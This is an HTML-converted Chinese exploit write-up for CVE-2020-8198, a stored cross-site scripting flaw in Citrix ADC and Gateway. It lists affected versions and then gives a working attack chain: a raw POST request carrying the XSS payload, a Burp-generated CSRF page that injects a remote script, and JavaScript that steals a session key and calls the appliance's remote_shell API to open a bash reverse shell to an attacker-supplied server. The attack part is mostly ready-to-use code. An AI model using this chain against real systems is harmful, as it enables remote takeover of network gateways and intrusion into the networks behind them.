<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>（CVE-2020-8198）Citrix 储存型xss</h1><h2>一、漏洞简介</h2><p>要求受害者以NSIP管理员（nsroot）的身份登录</p><h2>二、漏洞影响</h2><p>Citrix ADC and Citrix Gateway: &lt; 13.0-58.30</p><p>Citrix ADC and NetScaler Gateway: &lt; 12.1-57.18</p><p>Citrix ADC and NetScaler Gateway: &lt; 12.0-63.21</p><p>Citrix ADC and NetScaler Gateway: &lt; 11.1-64.14 </p><p>NetScaler ADC and NetScaler Gateway: &lt; 10.5-70.18</p><p>Citrix SD-WAN WANOP: &lt; 11.1.1a</p><p>Citrix SD-WAN WANOP: &lt; 11.0.3d</p><p>Citrix SD-WAN WANOP: &lt; 10.2.7</p><p>Citrix Gateway Plug-in for Linux: &lt;  1.0.0.137</p><h2>三、复现过程</h2><p>POST /menu/stapp HTTP/1.1<br />Host: www.0-sec.org<br />User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0<br />Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br />Accept-Language: en-US,en;q=0.5<br />Accept-Encoding: gzip, deflate<br />DNT: 1<br />Connection: close<br />Upgrade-Insecure-Requests: 1<br />Content-Length: 96<br />Content-Type: application/x-www-form-urlencoded<br />X-NITRO-USER: henk<br /><br />sid=254&amp;pe=1,2,3,4,5&amp;appname=%0a&lt;/title&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&amp;au=1&amp;username=nsroot</p><h3>深入利用</h3><p>csrf.html</p><p>&lt;html&gt;<br />  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;<br />  &lt;body&gt;<br />  &lt;script&gt;history.pushState('', '', '/')&lt;/script&gt;<br />    &lt;form action="https://www.0-sec.org/menu/stapp" method="POST"&gt;<br />      &lt;input type="hidden" name="sid" value="254" /&gt;<br />      &lt;input type="hidden" name="pe" value="1,2,3,4,5" /&gt;<br />      &lt;input type=&quot;hidden&quot; name=&quot;appname&quot; value=&quot;%0a&lt;/title&gt;&lt;script src='http://localhost:9090/code_exec.js'&gt;&lt;/script&gt;&quot; /&gt;<br />      &lt;input type="hidden" name="au" value="1" /&gt;<br />      &lt;input type="hidden" name="username" value="nsroot" /&gt;<br />      &lt;input type="submit" value="Submit request" /&gt;<br />    &lt;/form&gt;<br />  &lt;/body&gt;<br />&lt;/html&gt;</p><p>code_exec.js</p><p>function load(url, callback) {<br />  var xhr = new XMLHttpRequest();<br /><br />  xhr.onreadystatechange = function() {<br />    if (xhr.readyState === 4) {<br />      rand = callback(xhr.response);<br />      exec_command(rand);<br />    }<br />  }<br /><br />  xhr.open('GET', url, true);<br />  xhr.send('');<br />}<br /><br />function get_rand(payload) {<br />    var lines = payload.split("\n");<br />    for(var i = 0; i &lt; lines.length; i++) {<br />        if (lines[i].includes('var rand = &quot;')) {<br />            var rand = lines[i].split('&quot;')[1]<br />            return rand;<br />        }<br />    }<br />}<br /><br />function exec_command(rand) {<br />    url = '/rapi/remote_shell'<br />    command = 'bash -c \&quot;bash -i &gt;%26 /dev/tcp/你的服务器/16588 0&gt;%261\&quot;'<br /><br />    var obj = {<br />        "params":{<br />            "warning":"YES"<br />        },<br />        "remote_shell":{<br />            "command":command,<br />            "prompt":"&gt;",<br />            "target":"shell",<br />            "suppress":0,<br />            "execute_in_partition":""<br />        }<br />    }<br /><br />    var xhr = new XMLHttpRequest();<br />    <br />    xhr.onreadystatechange = function() {<br />        if (xhr.readyState === 4) {<br />            response = JSON.parse(xhr.response);<br />            alert(response['remote_shell']['output']);<br />        }<br />    }<br /><br />    xhr.open('POST', url, true);<br />    xhr.setRequestHeader('rand_key', rand)<br />    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded')<br />    xhr.send('object=' + JSON.stringify(obj));<br /><br />}<br /><br />var url = '/menu/stc';<br />load(url, get_rand)</p><p>1.png</p></body></html>